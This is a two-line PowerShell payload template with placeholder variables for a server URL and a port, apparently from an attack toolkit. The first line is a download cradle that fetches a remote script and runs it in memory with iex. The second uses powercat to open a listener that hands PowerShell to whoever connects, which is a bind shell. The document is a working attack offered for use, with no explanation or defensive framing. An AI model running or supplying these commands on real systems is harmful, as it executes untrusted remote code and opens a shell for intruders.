iex (New-Object System.Net.Webclient).DownloadString('{{ SRVURL }}')
powercat -l -p {{ LPORT }} -e powershell.exe
